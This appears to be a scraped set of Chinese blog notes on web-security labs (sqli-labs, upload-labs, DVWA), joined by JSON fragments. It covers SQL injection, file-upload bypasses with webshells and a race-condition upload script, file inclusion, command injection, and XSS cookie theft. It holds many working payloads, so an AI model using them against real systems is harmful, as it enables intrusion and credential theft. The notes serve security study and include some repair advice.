SQL注入的原理Sql注入漏洞的产生需要满足那两个条件？ 参数用户可控：前端传给后端的参数内容是用户可以控制的。 参数带入数据库查询：传入的参数拼接到sql语句，且带入数据库查询。当传入ID参数为1&#39;时，数据库执行的代码如下所示。 sehlect * from users where id =1&#39;这样是会报出错误的，因为这不符合数据库语法规范。当传入的ID参数为and 1=1 时，执行的SQL语句如下所示。select * from users where id = 1&#39; and 1=1因为1=1为真，且where语句中id1=1也为真，所以页面会返回与id=1相同的结果。当传入的ID参数为and 1=2时，由于1=2不成立，所以返回假，页面就会返回与id=1不同的结果。由此可以初步判断ID参数存在SQL注入漏洞，攻击者可以进一步拼接SQL语句进行攻击，致使数据库信息泄露，甚至进一步获取服务器权限等。—————————————————————————————————————————————————————在实际环境中，凡是满足上述两个条件的参数皆可能存在SQL注入漏洞，因此开发者需秉持“外部参数皆不可信的原则”进行开发。 ————————————————————————————————————————————————————— 与MySQL注入相关的知识点 Mysql数据库数据库A=网站A 表名 列名 数据数据库 B=网站B​x​数据库 ​&nbsp;在MySql5.0 版本之后，MySql默认在数据库中存放一个“information_schema”的数据库，在该库中，读者需要记住三个表名，分别是SCHEMATA,TABLES,COLUMNSSCHEMNSz表存储该用户创建的所有数据库的库名，我们需要记住该表中记录数据库库名的字段名为SCHEMA_NAMETABLES表存储该用户创建的所有数据库的库名和表名，我们需要记住该表中记录数据库库名和表名的字段名分别为TABLE_SCHEMA和TABLE_NAME。COLUMNS表名和字段名的字段名为TABLE_SCHEMA，TABLE_NAME和COLUMN_NAME。&nbsp;Mysql查询语句 在不知道任何条件时，语句如下所示。SELECT 要查询的字段名 FROM 库名.表名 在知道一条已知条件时，语句如下所示。SELECT 要查询的字段名 FROM 库名.表名 WHERE 已知条件的字段名=‘已知条件的值’ 在知道两条已知条件时，语句如下所示。SELECT 要查询的字段名 FROM 库名.表名 WHERE 已知道条件1的字段名=‘已知条件1的值’ AND 已知条件2的字段名=‘已知条件2的值’Limit 的用法Limit的使用格式为limit m,n, 其中m是指记录开始的位置，从0开始，表示第一条记录;n是指取n条记录。例如limit 0,1表示从第一条记录开始，取一条记录，需要记住的几个函数Database():当前网站使用的数据库Version():当前MySQL的版本User():当前MySQL的用户注释符号 在MySQL中，常见注释符的表达方式：#或-- 空格或/**/内联注释内联注释的形式：/! code/。内联注释可以用于整个SQL语句中，用来执行我们的SQL语句，下面举一个列： index.php?id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3&nbsp;Union（联合）注入攻击[在线靶场][http://43.247.91.228:84/Less-1/?id=1]http://127.0.0.1/sqli-labs/Less-1/?id=1一、判断是否用(&#39;)做字符串引号http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;and 1=1 --+https://blog.csdn.net/qq_41630808/article/details/80570197正常输出出错代表没有闭合 说明没有用’可能没有用&#39; 或用了&quot;或() http://127.0.0.1/sqli-labs/Less-1/?id=1%27and%201=2--+则是&#39;&#39;字符串注入二、判断它所在的数据库有几列http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;order by 3 --+ 判断是否有3列正常http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;order by 4 --+ 判断是否有4列错误说明它输出的内容所在的数据库有3列三、判断他显示的内容在数据库的第几列http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,2,3 --+则 Your Login name 在第二列Your Password在第三列我选择在第二列输出我想要的内容四、查找出当前用户权限http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,user(),3 --+root权限五、查找当前数据库http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,database(),3 --+当前数据库是 security六、查找security的表名http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema =&#39;security&#39;),3 --+表名是 emails,referers,uagents,usersgroup_concat()会计算哪些行属于同一组，将属于同一组的列显示出来。要返回哪些列，由函数参数(就是字段名)决定 七、查找users里的字段http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = &#39;security&#39; and table_name = &#39;users&#39;),3 --+八、查找用户名http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,(select group_concat(username) from security.users),3 --+ 九、查找密码http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,(select group_concat(password) from security.users),3 --+这样 这个就完成了 已经拿到了账号密码 Union (联合) 注入代码分析 在Union注入页面中，程序获取GET参数ID，将ID拼接到SQL语句中，在数据库中查询参数的ID对应的内容，然后将第一条查询结果中的username和address输出到页面，由于是将数据输出到页面上的，所以利用Union语句查询其他数据，代码如下： ![](http://ww1.sinaimg.cn/large/007bHQE8gy1g58le58wz5j30ou0bo77h.jpg)当访问id=1 union select 1,2,3时，执行的SQL语句为:`Select * from users where ‘id’=1 union select 1,2,3`` 此时sql语句可以分为select \\* from users where ‘id’=1和union select 1,2,3两条，利用第二条语句（Union查询）就可以获取数据库中的数据。 （优化在源码中添加sql语句执行代码）Boolean (布尔型) 注入攻击1&#39; and length(database())&gt;=1--+ //判断数据库的长度l&#39; and substr(database(),1,1)=‘t’ --+ //判断数据库第一个字母的值l&#39; and substr(database(),2,1)=‘q’ --+ //判断数据库的第二个字母的值l&#39; and ord(substr(database(),1,1))=115--+ //利用ord和ASCII判断数据库库名l&#39; and substr(database(),2,1)=’q’--+ //利用substr判断数据库的库名l&#39; and substr(select table_name from information_schema.table where table_schema=‘sql’ limit 0,1),1,1)=‘e’ --+ //利用substr判断数据库的表名 1. length(str)：返回str字符串的长度。2. substr(str, pos, len)：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始3. mid(str,pos,len):跟上面的一样，截取字符串4. ascii(str)：返回字符串str的最左面字符的ASCII代码值。5. ord(str):同上，返回ascii码6. if(a,b,c) :a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0Boolean (布尔型)注入代码分析在Boolean注入页面中程序先获取GET参数ID,通过preg_match判断其中是否存在union/sleep/benchmark等危险字符。然后将参数ID拼接到SQL语句，从数据库中查询，当访问id=1‘ or 1=1%23时，数据库执行的语句为selcet * from user where ‘id’=’1’ or 1=1#,由于or 1=1是永真条件，所有此时返回正常。当访问id=1‘ and 1=2%23时，数据库执行的语句为select * from users where ‘id’ = ‘1’ and 1=2#, 由于and‘1‘ =’2‘ 是永假条件，所有此时页面肯定会返=返回错误。报错注入攻击updatexml(1,concat(0x7e,(select user()),0x7e),1)--+ //利用updatexml获取user()‘ and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+ //利用updatexml获取database（）`‘ and updatexml(1,concat(0x7e,(select select schema_name from information_schema.schemata limit 0,1),0x7e),1)--+** //**利用报错注入获取数据库库名‘ and updatexml(1,concat(0x7e,(select select table_name from information_schema.tables where table_schema= ‘test’ limit 0,1),0x7e),1)--+ //利用报错注入获取数据库表名 xxxxxxxxxx​​## 报错注入攻击代码分析​​**在报错注入页面中，程序获取GET参数username 后，将username拼接到SQL语句中然后，然后到数据库查询。**​ ![](http://ww1.sinaimg.cn/large/007bHQE8gy1g58lsi2dz3j30ua0a9419.jpg)​ &nbsp; ​​输入username=1‘时，SQL语句为select * from user where ‘username’=‘1“。执行时会因为多了一个单引号而报错。利用这种错误回显，我们可以通过floor(),updatexml()​​等函数将要查询的内容输出到页面上。​​ ​​"},{"title":"","date":"2019-08-07T09:05:57.834Z","updated":"2019-08-01T10:09:47.443Z","comments":true,"path":"web安全/上传总结.html","permalink":"http://yoursite.com/web安全/上传总结.html","excerpt":"","text":"上传漏洞类型总结 0x01.限制上传的逻辑在前端 禁用js或者F12修改即可 0x02.仅限制Content-Type Burp截包，修改Content-Type，然后放行，即可绕过 0x03.可重写文件解析规则绕过 即先上传个.htaccess文件，让解析规则变更 &lt;FilesMatch “.jpg”&gt; SetHandler application/x-httpd-php 0x04.后缀名黑名单、过滤 黑名单 比如文件名后缀大小写混合绕过。.php改成.phP然后上传即可。感觉和XSS的一些过滤绕过非常相似。 可被利用过滤 这种只删除一次php的，即可： 双写文件名绕过，文件名改成xx.pphphp 0x05.可被利用Windows系统的特性 利用Windows系统的文件名特性 比如文件名最后增加点和空格，写成.php.，上传后保存在Windows系统上的文件名最后的一个.会被去掉，实际上保存的文件名就是.php Windows文件流特性绕过 文件名改成.php::$DATA，上传成功后保存的文件名其实是.php 0x06.可被截断绕过 上传路径名%00截断绕过 上传的文件名写成11.jpg, save_path改成…/upload/11.php%00，最后保存下来的文件就是11.php 0x07.文件头检查 添加GIF图片的文件头GIF89a，绕过GIF图片检查。 0x08.渲染函数导致可用图片webshell 原理：将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的。 0x09.条件竞争 利用条件竞争删除文件时间差绕过。 Pass-01 上传的限制逻辑在前端，js里，限制js执行即可上传成功。 Pass-02 截断上传数据包，修改Content-Type为image/gif，然后放行数据包 Pass-03 重写文件解析规则绕过。上传先上传一个名为.htaccess文件，内容如下： &lt;FilesMatch “03.jpg”&gt; SetHandler application/x-httpd-php 然后再上传一个03.jpg 执行上传的03.jpg脚本 Pass-04 方法同Pass-03, 重写文件解析规则绕过 Pass-05 文件名后缀大小写混合绕过。05.php改成05.phP然后上传 Pass-06 利用Windows系统的文件名特性。文件名最后增加点和空格，写成06.php.，上传后保存在Windows系统上的文件名最后的一个.会被去掉，实际上保存的文件名就是06.php Pass-07 原理同Pass-06，文件名后加点，改成07.php. Pass-08 Windows文件流特性绕过，文件名改成08.php::$DATA，上传成功后保存的文件名其实是08.php Pass-09 原理同Pass-06，上传文件名后加上点+空格+点，改为09.php. . Pass-10 双写文件名绕过，文件名改成10.pphphp Pass-11 上传路径名%00截断绕过。上传的文件名写成11.jpg, save_path改成…/upload/11.php%00，最后保存下来的文件就是11.php Pass-12 原理同Pass-11，上传路径0x00绕过。利用Burpsuite的Hex功能将save_path改成…/upload/12.php【二进制00】形式 Pass-13 绕过文件头检查，添加GIF图片的文件头GIF89a，绕过GIF图片检查。 使用命令copy normal.jpg /b + shell.php /a webshell.jpg，将php一句话追加到jpg图片末尾，代码不全的话，人工补充完整。形成一个包含Webshell代码的新jpg图片，然后直接上传即可。JPG一句话shell参考示例 png图片处理方式同上。PNG一句话shell参考示例 Pass-14 原理和示例同Pass-13，添加GIF图片的文件头绕过检查 png图片webshell上传同Pass-13。 jpg/jpeg图片webshell上传存在问题，正常的图片也上传不了，等待作者调整。 Pass-15 原理同Pass-13，添加GIF图片的文件头绕过检查 png图片webshell上传同Pass-13。 jpg/jpeg图片webshell上传同Pass-13。 Pass-16 原理：将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的。 这里提供一个包含一句话webshell代码并可以绕过PHP的imagecreatefromgif函数的GIF图片示例。 打开被渲染后的图片，Webshell代码仍然存在 提供一个jpg格式图片绕过imagecreatefromjpeg函数渲染的一个示例文件。 直接上传示例文件会触发Warning警告，并提示文件不是jpg格式的图片。但是实际上已经上传成功，而且示例文件名没有改变。 从上面上传jpg图片可以看到我们想复杂了，程序没有对渲染异常进行处理，直接在正常png图片内插入webshell代码，然后上传示例文件即可，并不需要图片是正常的图片。 程序依然没有对文件重命名，携带webshell的无效损坏png图片直接被上传成功。 Pass-17 利用条件竞争删除文件时间差绕过。使用命令pip install hackhttp安装hackhttp模块，运行下面的Python代码即可。如果还是删除太快，可以适当调整线程并发数。 #!/usr/bin/env python coding:utf-8Build By LandGreyimport hackhttp from multiprocessing.dummy import Pool as ThreadPool def upload(lists): hh = hackhttp.hackhttp() raw = “””POST /upload-labs/Pass-17/index.php HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Referer: http://127.0.0.1/upload-labs/Pass-17/index.php Cookie: pass=17 Connection: close Upgrade-Insecure-Requests: 1 Content-Type: multipart/form-data; boundary=—————————6696274297634 Content-Length: 341 —————————–6696274297634 Content-Disposition: form-data; name=“upload_file”; filename=“17.php” Content-Type: application/octet-stream —————————–6696274297634 Content-Disposition: form-data; name=“submit” 上传 —————————–6696274297634– “”” code, head, html, redirect, log = hh.http(‘http://127.0.0.1/upload-labs/Pass-17/index.php’, raw=raw) print(str(code) + “\\r”) pool = ThreadPool(10) pool.map(upload, range(10000)) pool.close() pool.join() 在脚本运行的时候，访问Webshell Pass-18 刚开始没有找到绕过方法，最后下载作者Github提供的打包环境，利用上传重命名竞争+Apache解析漏洞，成功绕过。 上传名字为18.php.7Z的文件，快速重复提交该数据包，会提示文件已经被上传，但没有被重命名。 快速提交上面的数据包，可以让文件名字不被重命名上传成功。 然后利用Apache的解析漏洞，即可获得shell Pass-19 原理同Pass-11，上传的文件名用0x00绕过。改成19.php【二进制00】.1.jpg 后记 有些非预期解"},{"title":"","date":"2019-08-07T09:05:57.838Z","updated":"2019-07-30T10:12:26.838Z","comments":true,"path":"web安全/文件包含漏洞.html","permalink":"http://yoursite.com/web安全/文件包含漏洞.html","excerpt":"","text":"文件包含文件包含常用函数 在php中提供了四种包含文件的函数 1.incudec() //找不到被包含的文件时只会产生警告（E_WARNING），脚本将继续执行； 2.incudec_once() //此语句和incudec（）语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含； 3.require() //找不到被包含的文件时会产生致命错误（E_COMPILE_ERROR），并停止脚本。 4.require_once() //此行语句和require（）语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。 文件包含实列： 1.本地文件包含 2.远程包含 文件包含利用： 1.读取敏感文件​ win系统 ​ linux系统 2.远程包含shell关键判断allow_url_fopen是激活的 3.本地包含配合文件上传。​ 1.先上传带有木马的/头像/文档 ​ 2.再用包含去访问 4.使用php封装协议​ 1使用封装协议读取php文件 ​ 2.写入php文件 ​ 受限与allow_url_include选项为on 5.包含Apache日志文件，​ 1.确定apache的日志路径 利用：访问不存在的路径会写到access.log文件中 如何通过burp来绕过编码？ 6.截断包含由于固定扩展名找不到1.jpg.php导致访问失败。 可以采用page=1.jpg%00 这种方法只使用于magic_quotes_gpc=off时 如果为on会被转义。 但可以用：单引号（’）双引号（‘’）反斜杠（\\）null 7.绕过waf防火墙文件包含用来制作后门，躲避web杀毒软件的检测。 但可以用：单引号（‘）双"},{"title":"","date":"2019-08-07T09:05:57.850Z","updated":"2019-07-23T08:43:39.851Z","comments":true,"path":"web安全/命令执行.html","permalink":"http://yoursite.com/web安全/命令执行.html","excerpt":"","text":"命令执行漏洞介绍命令执行漏洞应用程序有时需要调用一些执行系统命令的函数，如在PHP中，使用system.exec，shell_exec，passthru，passthru，popen，proc_popen等函数可以执行系统命令，当黑客能控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。 命令执行漏洞攻击 测试地址: http://192.168.1.180/4.9.3/rce.php?ip=127.0.0.1|dir Php文件页面中提供了ping的功能，当给参数IP输入127.0.0.1时，程序会执行ping127.0.0.1 然后将ping的结果返回到页面上。 而如果将参数IP设置为127.0.0.1 | dir ,然后再次访问，从返回结果可以看到，程序直接将目录结构返回到页面上了，这里就利用了管道符号”|”让系统执行了命令dir。 列如以下常用的管道符。 “|”：直接执行后面的语句。列如:ping 127.0.0.1|whoami “||”：如果前面执行的语句执行出错，则执行后面的语句，前面的语句只能为假。列如：ping2|whoami。 “&amp;”：如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。列如:ping 127.0.0.1&amp;whoami. “&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句只能为真。列如:ping 127.0.0.1&amp;&amp;whoami Linux系统支持的管道符如下： “;”：执行完前面的语句再执行后面的。列如:ping 127.0.0.1;whoami。 “|”：显示后面语句的执行结果。列如:ping 127.0.0.1|whoami。 “||”：当前面的语句执行出错时，执行后面的语句。列如:ping 1 || whoami。 “&amp;”：如果当前的语句为假则直接执行后面的语句，前面的语句可真可假。列如: ping 127.0.0.1&amp;whoami。 “&amp;&amp;”: 如果前面的语句为假则直接出错，也不执行后面的，前面的语句只能为真。列如:ping 127.0.0.1&amp;&amp;whoami。 命令执行漏洞代码分析服务器处理ping的代码如，程序获取GET参数IP，然后拼接到system()函数中，利用system()函数执行ping的功能，但是此处没有对参数IP做过滤和检测，导致可以利用管道符执行其他的系统命令 123456&lt;?phpecho system(&quot;ping -n 2 &quot; . $_GET[&apos;ip&apos;]);?&gt; 命令执行漏洞修复建议： 尽量不要使用命令执行函数 客户端提交的变量在进入执行命令函数前要做好过滤和检测。 在使用动态函数之前，确保使用的函数是指定的函数之一。 对PHP语言来说，不能完全控制的危险函数最好不要使用。"},{"title":"","date":"2019-08-07T09:05:57.840Z","updated":"2019-08-01T09:00:47.296Z","comments":true,"path":"web安全/文件上传.html","permalink":"http://yoursite.com/web安全/文件上传.html","excerpt":"","text":"文件上传https://www.cnblogs.com/shellr00t/p/6426945.html 前言： 文件上传漏洞可以说是日常渗透测试用得最多的一个漏洞，因为用它获得服务器权限最快最直接。但是想真正把这个漏洞利用好却不那么容易，其中有很多技巧，也有很多需要掌握的知识。俗话说，知己知彼方能百战不殆，因此想要研究怎么防护漏洞，就要了解怎么去利用。 文件上传漏洞产生原理上传文件时，如果服务端代码未对客户端上传的文件进行严格的验证和过滤，就容易造成可以上传任意文件的情况，包括上传脚本文件（ap,aspx,php,jsp等格式文件）。 文件上传漏洞的危害非法用户可以利用上传的恶意脚本文件控制整个网站，甚至控制服务器。这个恶意的脚本文件，又被称为WebShell，也可将webshell脚本称为一种网页后门，webshell脚本具有非常强大的功能，比如查看服务器目录，服务器中的文件，执行系统命令等。 JS检测绕过攻击l 使用浏览器的插件，删除检测文件后缀的JS代码，然后上传文件即可绕过。 l 首先把需要上传文件的后缀改成允许上传的，如jpg,png等，绕过JS检测，再抓包，把后缀名改成可执行文件的后缀即可上传成功 JS检测绕过攻击分析JS检测绕过攻击： 在本地搭建的上传测试地址为：http://192.168.1.180/4.7.4/upload.html 0x01:访问靶场上传一句话木马。 出现了报错，要求上传jpg格式的照片 0x02：把一句话木马的文件格式改为jpg，通过使用burp 抓包更改上传文件格式，为php。 通过更改文件的格式来对js的过滤就行绕过。 0x03：对JS检测绕过攻击代码分析： 上传文件的HTML代码，在选择文件时，会调用JS的selectFile函数，函数的作用是先将文件名转换为小写，然后通过substr获取文件名最后一个点号后面的后缀。如果后缀不是“.jpg”,则会弹框提示“请选择jpg格式的照片上传” 服务端处理上传文件的代码，如果上传文件没出错，再通过file_exists判断在upload目录下文件是否已存在，不存在的话就通过move_uploaded_file将文件保存到upload目录，此PHP代码中没有对文件后缀做任何判断，所以只需要绕过前端JS的校验就可以上传一句话木马。 文件后缀绕过攻击文件后缀绕过攻击是服务端代码中限制了某些后缀的文件不允许上传，但是有些Apache是允许解析其他文件后缀的 在Apache的解析顺序中，是从右到左开始解析文件后缀的，如果最右侧的扩展名不可识别，就继续往左判断，直到遇到可以解析的文件后缀为止，所以如果在上传的文件名类似1.php.xxx 因为后缀xxx不可以解析，所以向解析后缀php。 文件后缀绕过代码分析文件后缀绕过： 通过函数patinfo（）获取文件后缀，将后缀转换为小写后，判断是不是“php”，如果上传文件的后缀是php，则不允许上传，所以此处可以通过利用Apache解析顺序或上传phtml等后缀的文件绕过该代码的限制。 文件类型绕过攻击在客户端上传文件时，通过Burp Suite抓取数据包，当上传一个php格式的文件时，可以看到数据包中Content-Type的值是application/octet-stream，而上传jpg格式的文件时，数据包中Content-Type的值是image/jpeg 如果服务端代码是通过Content-Type的值来判断文件的类型，那么就存在被绕过的可能，因为Content-Type的值是通过客户端传递的，是可以任意修改的。所以当上传一个php文件时，在Burp Suite中将Content-Type修改为image/jpeg。就可以绕过服务端的检测 文件类型绕过代码分析0x01:使用burp 抓包工具进行抓包分析。测试地址：http://192.168.1.180/4.7.8/upload.html 上传php文件，更改上传文件类型就可以进行绕过。 代码分析： 服务端代码判断$_FILES[“file”][“type”]是不是图片的格式（image/gif,image/jpeg,image/pjpeg）,如果不是，则不允许上传该文件，而$_FILES[“file”][“type”]是客户端请求数据包中的Content-Type，所以可以通过修改content-Type的值绕过该代码的限制。 在PHP中还存在一种相似的文件上传漏洞，PHP函数getimagesize()可以获取图片的宽，高信息，如果上传的不是图片文件，那么getimagesize（）就获取不到信息，则不允许上传。 但是，我们可以将一个图片和一个webshell合并为一个文件，列如使用以下命令。 Cat image.png webshell.php &gt; image.php 此时，使用getimagesize()就可以获取图片信息，且WebShell的后缀是php，也能被Apache解析为脚本文件，通过这种方式就可以绕过getimagesize()的限制。 文件类型绕过攻击： 文件截断绕过攻击截断类型：php%00截断 1.php.%00.jpg 截断：0x00 ，%00 ，/00 截断原理：由于00代表结束符，所以会把00后面的所有字符删除。 截断条件：php版本小于5.3.4 php的magic_quotes_gpc为off状态。 文件截断绕过代码分析竞争条件攻击一些网站上传文件的逻辑是允许上传任意文件，然后检查上传的文件是否包含webshell脚本，如果包含则删除该文件。这里存在的问题是文件上传成功后和删除文件之间存在一个短的时间差（因为要执行检查文件和删除文件的操作），攻击者就可以利用这个时间差完成竞争条件的上传漏洞攻击。 竞争条件代码分析文件上传修复建议通过白名单的方式判断文件后缀是否合法·. 对上传后的文件进行重命名。"},{"title":"","date":"2019-08-07T09:05:01.783Z","updated":"2019-07-23T06:08:01.231Z","comments":true,"path":"xss/xss进阶.html","permalink":"http://yoursite.com/xss/xss进阶.html","excerpt":"","text":"XSS进阶：https://www.freebuf.com/articles/web/153055.html XSS常用的测试语句有：&lt;scrip&gt;alert(/xss/)&lt;/scrip&gt; &lt;img src=x onerror=alert(/xss/)&gt; &lt;svg onload=alert(xss/)&gt; &lt;a href=javascript:alert(/xss/)&gt; 常见的xss的绕过编码有js编码，HTML实体编码和URL编码。JS编码JS提供了四种字符编码的策略， 三个八进制数字，如果个数不够，在前面补0，列如:”e”的编码为“\\145”. 两个十六进制数字，如果个数不够，在前面补0，列如“e”的编码为“\\x65”. 四个十六进制数字，如果个数不够，在前面补0，列如“e”的编码为“\\u0065” 对于一些控制字符，使用特殊的C类型的转义风格（例如\\n和\\r） HTML 实体编码命名实体：以&amp;开头，以分号结尾的，列如“&lt;”的编码是“&amp;lt“. 字符编码：十进制，十六进制ASCII码或Unicode字符编码，样式为“&amp;#数值；“， 列如“&lt;“ 可以编码为”&#060;“和 ”&amp;#x3c；“。 URL 编码这里的URL编码，也是两次URL全编码的结果。如果alert被过滤， 结果为:%25%36%31%25%36%43%25%36%35%25%37%32%25%37%34 在使用XSS编码测试时，需要考虑HTML渲染的顺序，特别是针对多种编码组合时，要选择合适的编码方式进行测试。 使用XXS平台测试xss漏洞。XSS漏洞修复建议因为XSS漏洞涉及输入和输出两部分，所以其修复也分为两种。 过滤输入的数据，包括““” “&lt;“ “&gt;” “on”等非法字符。 对输出到页面的数据进行相应的编码转换，包括HTML实体编码，JavaScript 编码等。"},{"title":"","date":"2019-08-07T09:05:01.780Z","updated":"2019-07-30T01:55:04.150Z","comments":true,"path":"xss/xss基础.html","permalink":"http://yoursite.com/xss/xss基础.html","excerpt":"","text":"Xss原理分析输出问题导致的js代码的被执行 1.反射型XSS 反射性XSS又称为非持久型XSS，这种攻击方式 攻击方式：攻击者通过电子邮件等方式将包含XSS代码的恶意链接发送给目标用户当目标用户访问该链接时，服务器接受该目标用户的请求并进行处理，然后服务器把带有XSS代码的数据发送给目标用户的浏览器，浏览器解析这段带有XSS代码的恶意脚本后，就会触发XSS漏洞。 2.存储型XSS 存储型XSS又称持久型xss，攻击脚本将被永久地存放在服务器的数据库或文件中，具有很高的隐蔽性。 攻击方式：这种攻击多见于论坛，博客和留言板，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久地被存放在服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在他们的浏览器中得到执行。 3.DOM型XSS DOM 型xss其实是一种特殊类型的反射型xss它是基于DOM文档对象模型的一种漏洞。 攻击方式：用户请求一个经过专门设计的URL，它由攻击者提交，而且其中包含xss代码。服务器的响应不会以任何形式包含攻击者的脚本。当用户的浏览器处理这个响应时，DOM对象就会处理xss代码，导致存在XSS漏洞。 Xss技术分类反射型跨站（非持续型） alert(/xss/) 存储型跨站（持续型） DOM型 https://xz.aliyun.com/t/3919 Xss常见的攻击盗取cookie 反射型XSS：[靶场地址][http://43.247.91.228:81/vulnerabilities/xss_r/] 用户：admin 密码：password 0x1.选择安全等级为low 0x2.选择XSS reflected在选择框输入xss 弹出显示代码：alert(/OOO/) 0x3. 查看源代码分析过滤了什么？点击view source 查看源代码 上述代码中没有对name参数作任何过滤和检查，存在明显的xss漏洞。 2x01 将代码的安全等级调整为medium 2x02 选择XSS reflected ,并输入:alert(/xss/) 检查xss漏洞。 发现输出： hello alert(/xss/) ，这里表面对name 参数进行了过滤。 2x03.这里我们直接打开源代码分析过滤了什么？ 发现多了str_replace(‘','',$_GET['name'])这段代码，这句代码替换标签为''空字符。所以我们可以使用双写绕过。 2x04 另一种方法，大小的混淆绕过：输入：alert(/xss/)&lt;pre3x01 将代码安全等级设置为high 模式 3x01 将代码安全等级设置为high 模式 3x02 我们直接打开代码进行查看，过滤了什么？ 这里利用了htmlspecialchars()函数进行过滤。这个函数可以把&amp; （和号）、”（双引号）、’（单引号）、&lt;（小于）、&gt;（大于）这些敏感符号都进行转义，所有的跨站语句中基本都离不开这些符号，因而只需要这一个函数就阻止了XSS漏洞，所以跨站漏洞的代码防御还是比较简单的。 反射型xss盗取cookie以管理员身份登录到DWVA ，DWVA Security 设置为 LOW 并点击submit 点击XSS(Reflected) 在输入框输入alert(‘xss’) 验证是否存在xss漏洞 打开xss平台 ，新建一个xss利用项目： 查看xss利用的源代码： 调用攻击代码放到xss注入点，盗取到登录的cookie 再利用cookie利用工具进行登录利用 DVWA储存型xss0x01 设置代码安全等级为: low 级别 0x02 在内容框中输入储存型xss 测试代码：&lt;script&gt;alert(/xss/)&lt;/script&gt; 0x03 我们通过刷新链接 检查xss是否已经存储代码。 发现代码已经存储。 0x04 打开在线的xss平台，生成盗取cookie 的代码写入到xxs漏洞处，盗取登录用户的cookie。 已经盗取到登录用户的cookie。 0x05 查看源代码，存在的问题。 1x01 将代码的安全等级设置为medium 1x02 测试xss 的漏洞存在那个地方？ 在内容框输入alert(/xss/) 发现没有弹出xss 1x03 打开代码进行分析 使用函数对输入的函数进行了过滤。"},{"title":"","date":"2019-08-07T09:05:57.847Z","updated":"2019-07-29T10:03:16.169Z","comments":true,"path":"web安全/查询函数.html","permalink":"http://yoursite.com/web安全/查询函数.html","excerpt":"","text":"extractvalue() 列如：uname=admin&#39; and extractvalue(1,concat(0x7e,(select database())))--+&amp;passwd=admin&amp;submit=Submit"},{"title":"","date":"2019-08-07T09:05:57.845Z","updated":"2019-07-23T06:19:35.819Z","comments":true,"path":"web安全/暴力破解.html","permalink":"http://yoursite.com/web安全/暴力破解.html","excerpt":"","text":"暴力破解：介绍暴力破解漏洞暴力破解的产生是由于服务器端没有做限制，导致攻击者可以通过暴力的手段破解所需要信息，如用户名，密码，验证码等。暴力破解需要一个庞大的字典，如4位数字的验证码，那么暴力破解的范围就是0000-9999,暴力破解的关键在于字典的大小。 暴力破解漏洞攻击 sqli-labs(五)——盲注（boolean盲注以及时间盲注） 第八关： url：http://192.168.1.180/sqli-labs/Less-8/?id=1 没有查询信息，输入id=1’ 报错 ，也没有报错信息，这里应该是个盲注 使用boolean的盲注吧 先判断boolean的盲注可行 输入id=1’ and ‘1’=’1’ %23 页面正常 输入id=1’ and ‘1’=’2’ %23 页面报错 由于返回结果只有两种结果，所以此处可以尝试利用Boolean注入， Boolean注入是指构造SQL判断语句，通过查看页面的返回结果来推测那些SQL判断条件是成立的，以此获取数据库中的数据。我们先判断数据库名的长度，语句如： ‘ and length(database())&gt;=1–+ 有单引号，所以需要注释符来注释。1的位置上可以是任意数字，如’and length (database())&gt;=3–+和‘and length (database())&gt;=4–+,我们可以构造这样的语句，然后观察页面的返回结果。 http://192.168.1.180/sqli-labs/Less-8/?id=1&#39; and length(database())&gt;=8–+ http://192.168.1.180/sqli-labs/Less-8/?id=1&#39; and length(database())&gt;=9–+ 数据库库名长度大于等于8，结果返回正常。大于等于9，结果出现了返回页面不正常。 由此判断出数据库的库名长度为8 有几个mysql内置的函数需要记住： length(str)：返回str字符串的长度。 substr(str, pos, len)：将str从pos位置开始截取len长度的字符进行返回。 注意这里的pos位置是从1开始的，不是数组的0开始 mid(str,pos,len):跟上面的一样，截取字符串 ascii(str)：返回字符串str的最左面字符的ASCII代码值。 ord(str):同上，返回ascii码 if(a,b,c) :a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0 盲注需要一个字符一个字符的来判断，必须如先判断当前的数据库名的第一个字符是什么（可以使用sqlmap或脚本） 接着，使用逐字符判断的方式获取数据库库名。数据库库名的范围一般在a-z，0-9之内，可能还有一些特殊字符，这里的字母不区分大小写。逐字符判断的SQL语句： ‘ and substr(database(),1,1)=’t’–+ Substr是截取的意思，其意思是截取database()的值，从第一个字符开始，每次只返回一个。 Substr的用法跟limit的有区别，需要注意。Limit是从0开始排序，而这里是从1开始排序。可以使用Burp的爆破功能爆破其中的‘t‘值， 如： 